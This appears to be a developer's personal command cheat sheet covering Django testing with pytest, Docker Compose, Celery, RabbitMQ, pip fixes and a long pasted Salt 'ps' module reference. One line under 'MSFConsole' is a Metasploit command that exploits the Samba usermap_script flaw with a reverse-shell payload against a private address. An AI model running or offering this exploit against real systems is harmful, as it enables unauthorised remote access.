=====================
Notes - Commands
=====================
*** All test files must begin with test_ because that is the convention used with Pytest. ***


python -m pytest
python -m pytest .
pytest -vv

docker-compose exec web python3 -m pytest -k "test_task_status"
docker-compose exec web python3 -m pytest -k "test_task and not tappest_home"

# Sources #
https://docs.djangoproject.com/en/dev/internals/contributing/writing-code/unit-tests/
https://docs.pytest.org/en/6.2.x/index.html
https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Testing
https://docs.djangoproject.com/en/dev/topics/cache/#memcached


https://github.com/features/actions


https://github.com/topics/django-test
https://github.com/revsys/django-test-plus
https://www.section.io/engineering-education/dockerized-django-application-with-github-actions/
https://github.com/wemake-services/django-test-migrations
https://github.com/seporaitis/django-tutorial-tests

https://snarky.ca/what-the-heck-is-pyproject-toml/


##################################################################################################
#                                   Loading Sample Datasets                                      #
##################################################################################################

docker-compose exec web python manage.py loaddata products.json

##################################################################################################
#                                   Settings.py Modifications                                    #
##################################################################################################


## Allow you to delete more than 1000 items from database via admin console

DATA_UPLOAD_MAX_NUMBER_FIELDS = 10240 # higher than the count of fields


##################################################################################################
#                                   Celery Testing                                               #
##################################################################################################

sudo docker-compose exec celery celery -A core inspect active  ## this shows the current workers, and what tasks, if any they have, and their health.

celery -A core worker -l info -B  ## This starts the celery scheduler for the "Core" project, the worker, and starts the beat, which starts all of the scheduled celery jobs running

##################################################################################################
#                                   Django Custom Commands                                       #
##################################################################################################

docker-compose exec web python3 manage.py my_custom_command
docker-compose exec web python3 manage.py email_report


######################################################################

docker-compose exec <service-name> bash ### To enter the shell of a specific container thats up and running

docker-compose run --rm web bash ### ifyou want to run a command against a new container thats not currently running

##################################################################################################
#                                   Testing Various Services                                     #
##################################################################################################

curl http://localhost:1337/tasks/25278457-0957-4b0b-b1da-2600525f812f/
curl -F type=1 http://localhost:1337/tasks/

##################################################################################################
#                                   Reading/Acessing Various Logs                                #
##################################################################################################

docker-compose logs -f
docker-compose logs -f 'celery'
docker-compose logs 'web'
docker-compose logs 'celery'
docker-compose logs 'celery-beat'
docker-compose logs 'redis'




##################################################################################################
#                                   Special Notes                                                #
##################################################################################################



##################################################################################################
#                                              Issues                                            #
##################################################################################################

If Celery Tasks arent showing up in django_celery_results, check to see if beats is running properly. this can be achieved with:

sudo docker-compose exec celery celery -A core beat -l info

If it gives an error about celerybeat.pid file already existing. Delete the old one, it has fixed the issue for me in the past.



## pip install issues with SSL/TLS

pip install --upgrade pip --trusted-host pypi.org --trusted-host files.pythonhosted.org

## issues with potentially outdated pip packages

pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U

##################################################################################################
#                                            RabbitMQ                                            #
##################################################################################################
RabbitMQ

//  /galaxy/tooling
sudo python3 alt-rabbitmq-work-queue-worker.py

sudo python3 alt-rabbitmq-work-queue.py 192.168.1.1 Battleroom-11


##################################################################################################
#                                           MSFConsole                                           #
##################################################################################################

 msfconsole -x "use exploit/multi/samba/usermap_script; set RHOST 172.16.194.172; set PAYLOAD cmd/unix/reverse; set LHOST 172.16.194.163; run"

##################################################################################################
#                                   Clear Migrations Cache                                       #
##################################################################################################

find . -path "*/migrations/*.py" -not -name "__init__.py" -delete
find . -path "*/migrations/*.pyc"  -delete

#####################################################################################################################################

'command': r'systemctl status pritunl-client | grep -i -B10 "active:" | grep -iv "Drop-In:" | grep -iv "Loaded:"',

for i in $(find . -iname "*license*");do echo $i ;  head -2 $i ; done >> licenses.txt


git clone git@github.com:pondurance/sidecar_automation.git
cd sidecar_automation
git checkout sidecar-improvements-q2
cd sidecar_adhoc
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install ...py_graylog
python manage_sidecars.py -i {file}.csv
^ Run this first. Check for possible issues.
Then and only then, use --manage
python manage_sidecars.py -i {file}.csv --manage

[Another terminal]
git clone git@github.com:pondurance/py_graylog.git
cd py_graylog
git checkout sidecar-improvements-q2

##################################################################################################
#                                   Salt API Alcali Commands                                     #
##################################################################################################
Salt-API Alcali Commands:

salt '*' grains.items os_family         ## Gets OS type (Debian, redhat, etc)

salt '*' pillar.items                   ## Gets minions pillar items

salt '*' grains.ls                      ## Shows all available grains to query

salt '*' ps.total_physical_memory       ## Shows total physical memory

salt '*' ps.virtual_memory              ## Shows free Virtual Memory

salt '*' ps.cpu_percent                 ## Shows CPU Percent Usage

salt '*' ps.cpu_times                   ## Shows CPU Times, iowait, etc

salt '*' ps.disk_io_counters            ## Disk IO, Currently Broken

salt '*' ps.disk_partition_usage        ## Disk Partition Usage

salt '*' ps.disk_partitions             ## Disk Partitions

salt '*' ps.disk_usage <path>           ## Disk Usage of path defined, USed, total, Free, Percent

salt '*' ps.boot_time                   ## Get Boot Time

salt '*' ps.get_pid_list                ## Get complete list of PIDs

salt '*' ps.get_users                   ## Get users logged in

salt '*' ps.lsof <service name>         ## Apache2, for example, gives load information of given service

salt '*'  ps.network_io_counters        ## Gives you network I/O, can use interface=<interface> to specify specific interface

salt '*' ps.proc_info <pid>             ## Gives you proc info related to PID.

salt '*' ps.psaux salt                  ## Output that corresponds with AUX. Shows process running, as what user, as what binary, etc



ps.boot_time:

            Return the boot time in number of seconds since the epoch began.

            CLI Example:

            time_format
                Optionally specify a `strftime`_ format string. Use
                ``time_format='%c'`` to get a nicely-formatted locale specific date and
                time (i.e. ``Fri May  2 19:08:32 2014``).

                .. _strftime: https://docs.python.org/2/library/datetime.html#strftime-strptime-behavior

                New in version 2014.1.4

                salt '*' ps.boot_time

    ps.cpu_percent:

            Return the percent of time the CPU is busy.

            interval
                the number of seconds to sample CPU usage over
            per_cpu
                if True return an array of CPU percent busy for each CPU, otherwise
                aggregate all percents into one number

            CLI Example:

                salt '*' ps.cpu_percent

    ps.cpu_times:

            Return the percent of time the CPU spends in each state,
            e.g. user, system, idle, nice, iowait, irq, softirq.

            per_cpu
                if True return an array of percents for each CPU, otherwise aggregate
                all percents into one number

            CLI Example:

                salt '*' ps.cpu_times

    ps.disk_io_counters:

            Return disk I/O statistics.

            CLI Example:

                salt '*' ps.disk_io_counters

                salt '*' ps.disk_io_counters device=sda1

    ps.disk_partition_usage:

            Return a list of disk partitions plus the mount point, filesystem and usage
            statistics.

            CLI Example:

                salt '*' ps.disk_partition_usage

    ps.disk_partitions:

            Return a list of disk partitions and their device, mount point, and
            filesystem type.

            all
                if set to False, only return local, physical partitions (hard disk,
                USB, CD/DVD partitions).  If True, return all filesystems.

            CLI Example:

                salt '*' ps.disk_partitions

    ps.disk_usage:

            Given a path, return a dict listing the total available space as well as
            the free space, and used space.

            CLI Example:

                salt '*' ps.disk_usage /home

    ps.get_pid_list:

            Return a list of process ids (PIDs) for all running processes.

            CLI Example:

                salt '*' ps.get_pid_list

    ps.get_users:

            Return logged-in users.

            CLI Example:

                salt '*' ps.get_users

    ps.kill_pid:

            Kill a process by PID.

                salt 'minion' ps.kill_pid pid [signal=signal_number]

            pid
                PID of process to kill.

            signal
                Signal to send to the process. See manpage entry for kill
                for possible values. Default: 15 (SIGTERM).

            **Example:**

            Send SIGKILL to process with PID 2000:

                salt 'minion' ps.kill_pid 2000 signal=9

    ps.lsof:

            Retrieve the lsof information of the given process name.

            CLI Example:

                salt '*' ps.lsof apache2

    ps.netstat:

            Retrieve the netstat information of the given process name.

            CLI Example:

                salt '*' ps.netstat apache2

    ps.network_io_counters:

            Return network I/O statistics.

            CLI Example:

                salt '*' ps.network_io_counters

                salt '*' ps.network_io_counters interface=eth0

    ps.num_cpus:

            Return the number of CPUs.

            CLI Example:

                salt '*' ps.num_cpus

    ps.pgrep:

            Return the pids for processes matching a pattern.

            If full is true, the full command line is searched for a match,
            otherwise only the name of the command is searched.

                salt '*' ps.pgrep pattern [user=username] [full=(true|false)]

            pattern
                Pattern to search for in the process list.

            user
                Limit matches to the given username. Default: All users.

            full
                A boolean value indicating whether only the name of the command or
                the full command line should be matched against the pattern.

            pattern_is_regex
                This flag enables ps.pgrep to mirror the regex search functionality
                found in the pgrep command line utility.

                New in version 3001

            **Examples:**

            Find all httpd processes on all 'www' minions:

                salt 'www.*' ps.pgrep httpd

            Find all bash processes owned by user 'tom':

                salt '*' ps.pgrep bash user=tom

    ps.pkill:

            Kill processes matching a pattern.

                salt '*' ps.pkill pattern [user=username] [signal=signal_number] \
                        [full=(true|false)]

            pattern
                Pattern to search for in the process list.

            user
                Limit matches to the given username. Default: All users.

            signal
                Signal to send to the process(es). See manpage entry for kill
                for possible values. Default: 15 (SIGTERM).

            full
                A boolean value indicating whether only the name of the command or
                the full command line should be matched against the pattern.

            **Examples:**

            Send SIGHUP to all httpd processes on all 'www' minions:

                salt 'www.*' ps.pkill httpd signal=1

            Send SIGKILL to all bash processes owned by user 'tom':

                salt '*' ps.pkill bash signal=9 user=tom

    ps.proc_info:

            Return a dictionary of information for a process id (PID).

            CLI Example:

                salt '*' ps.proc_info 2322
                salt '*' ps.proc_info 2322 attrs='["pid", "name"]'

            pid
                PID of process to query.

            attrs
                Optional list of desired process attributes.  The list of possible
                attributes can be found here:
                http://pythonhosted.org/psutil/#psutil.Process

    ps.psaux:

            Retrieve information corresponding to a "ps aux" filtered
            with the given pattern. It could be just a name or a regular
            expression (using python search from "re" module).

            CLI Example:

                salt '*' ps.psaux www-data.+apache2

    ps.ss:

            Retrieve the ss information of the given process name.

            CLI Example:

                salt '*' ps.ss apache2

            New in version 2016.11.6


    ps.swap_memory:

            New in version 2014.7.0

            Return a dict that describes swap memory statistics.

            Note:

                This function is only available in psutil version 0.6.0 and above.

            CLI Example:

                salt '*' ps.swap_memory

    ps.top:

            Return a list of top CPU consuming processes during the interval.
            num_processes = return the top N CPU consuming processes
            interval = the number of seconds to sample CPU usage over

            CLI Examples:

                salt '*' ps.top

                salt '*' ps.top 5 10

    ps.total_physical_memory:

            Return the total number of bytes of physical memory.

            CLI Example:

                salt '*' ps.total_physical_memory

    ps.virtual_memory:

            New in version 2014.7.0

            Return a dict that describes statistics about system memory usage.

            Note:

                This function is only available in psutil version 0.6.0 and above.

            CLI Example:

                salt '*' ps.virtual_memory

    ps.:
        'ps.' is not available.
master:
    ----------
    ps.boot_time:

            Return the boot time in number of seconds since the epoch began.

            CLI Example:

            time_format
                Optionally specify a `strftime`_ format string. Use
                ``time_format='%c'`` to get a nicely-formatted locale specific date and
                time (i.e. ``Fri May  2 19:08:32 2014``).

                .. _strftime: https://docs.python.org/2/library/datetime.html#strftime-strptime-behavior

                New in version 2014.1.4

                salt '*' ps.boot_time

    ps.cpu_percent:

            Return the percent of time the CPU is busy.

            interval
                the number of seconds to sample CPU usage over
            per_cpu
                if True return an array of CPU percent busy for each CPU, otherwise
                aggregate all percents into one number

            CLI Example:

                salt '*' ps.cpu_percent

    ps.cpu_times:

            Return the percent of time the CPU spends in each state,
            e.g. user, system, idle, nice, iowait, irq, softirq.

            per_cpu
                if True return an array of percents for each CPU, otherwise aggregate
                all percents into one number

            CLI Example:

                salt '*' ps.cpu_times

    ps.disk_io_counters:

            Return disk I/O statistics.

            CLI Example:

                salt '*' ps.disk_io_counters

                salt '*' ps.disk_io_counters device=sda1

    ps.disk_partition_usage:

            Return a list of disk partitions plus the mount point, filesystem and usage
            statistics.

            CLI Example:

                salt '*' ps.disk_partition_usage

    ps.disk_partitions:

            Return a list of disk partitions and their device, mount point, and
            filesystem type.

            all
                if set to False, only return local, physical partitions (hard disk,
                USB, CD/DVD partitions).  If True, return all filesystems.

            CLI Example:

                salt '*' ps.disk_partitions

    ps.disk_usage:

            Given a path, return a dict listing the total available space as well as
            the free space, and used space.

            CLI Example:

                salt '*' ps.disk_usage /home

    ps.get_pid_list:

            Return a list of process ids (PIDs) for all running processes.

            CLI Example:

                salt '*' ps.get_pid_list

    ps.get_users:

            Return logged-in users.

            CLI Example:

                salt '*' ps.get_users

    ps.kill_pid:

            Kill a process by PID.

                salt 'minion' ps.kill_pid pid [signal=signal_number]

            pid
                PID of process to kill.

            signal
                Signal to send to the process. See manpage entry for kill
                for possible values. Default: 15 (SIGTERM).

            **Example:**

            Send SIGKILL to process with PID 2000:

                salt 'minion' ps.kill_pid 2000 signal=9

    ps.lsof:

            Retrieve the lsof information of the given process name.

            CLI Example:

                salt '*' ps.lsof apache2

    ps.netstat:

            Retrieve the netstat information of the given process name.

            CLI Example:

                salt '*' ps.netstat apache2

    ps.network_io_counters:

            Return network I/O statistics.

            CLI Example:

                salt '*' ps.network_io_counters

                salt '*' ps.network_io_counters interface=eth0

    ps.num_cpus:

            Return the number of CPUs.

            CLI Example:

                salt '*' ps.num_cpus

    ps.pgrep:

            Return the pids for processes matching a pattern.

            If full is true, the full command line is searched for a match,
            otherwise only the name of the command is searched.

                salt '*' ps.pgrep pattern [user=username] [full=(true|false)]

            pattern
                Pattern to search for in the process list.

            user
                Limit matches to the given username. Default: All users.

            full
                A boolean value indicating whether only the name of the command or
                the full command line should be matched against the pattern.

            pattern_is_regex
                This flag enables ps.pgrep to mirror the regex search functionality
                found in the pgrep command line utility.

                New in version 3001

            **Examples:**

            Find all httpd processes on all 'www' minions:

                salt 'www.*' ps.pgrep httpd

            Find all bash processes owned by user 'tom':

                salt '*' ps.pgrep bash user=tom

    ps.pkill:

            Kill processes matching a pattern.

                salt '*' ps.pkill pattern [user=username] [signal=signal_number] \
                        [full=(true|false)]

            pattern
                Pattern to search for in the process list.

            user
                Limit matches to the given username. Default: All users.

            signal
                Signal to send to the process(es). See manpage entry for kill
                for possible values. Default: 15 (SIGTERM).

            full
                A boolean value indicating whether only the name of the command or
                the full command line should be matched against the pattern.

            **Examples:**

            Send SIGHUP to all httpd processes on all 'www' minions:

                salt 'www.*' ps.pkill httpd signal=1

            Send SIGKILL to all bash processes owned by user 'tom':

                salt '*' ps.pkill bash signal=9 user=tom

    ps.proc_info:

            Return a dictionary of information for a process id (PID).

            CLI Example:

                salt '*' ps.proc_info 2322
                salt '*' ps.proc_info 2322 attrs='["pid", "name"]'

            pid
                PID of process to query.

            attrs
                Optional list of desired process attributes.  The list of possible
                attributes can be found here:
                http://pythonhosted.org/psutil/#psutil.Process

    ps.psaux:

            Retrieve information corresponding to a "ps aux" filtered
            with the given pattern. It could be just a name or a regular
            expression (using python search from "re" module).

            CLI Example:

                salt '*' ps.psaux www-data.+apache2

    ps.ss:

            Retrieve the ss information of the given process name.

            CLI Example:

                salt '*' ps.ss apache2

            New in version 2016.11.6


    ps.swap_memory:

            New in version 2014.7.0

            Return a dict that describes swap memory statistics.

            Note:

                This function is only available in psutil version 0.6.0 and above.

            CLI Example:

                salt '*' ps.swap_memory

    ps.top:

            Return a list of top CPU consuming processes during the interval.
            num_processes = return the top N CPU consuming processes
            interval = the number of seconds to sample CPU usage over

            CLI Examples:

                salt '*' ps.top

                salt '*' ps.top 5 10

    ps.total_physical_memory:

            Return the total number of bytes of physical memory.

            CLI Example:

                salt '*' ps.total_physical_memory

    ps.virtual_memory:

            New in version 2014.7.0

            Return a dict that describes statistics about system memory usage.

            Note:

                This function is only available in psutil version 0.6.0 and above.

            CLI Example:

                salt '*' ps.virtual_memory

    ps.:
        'ps.' is not available.
 ~$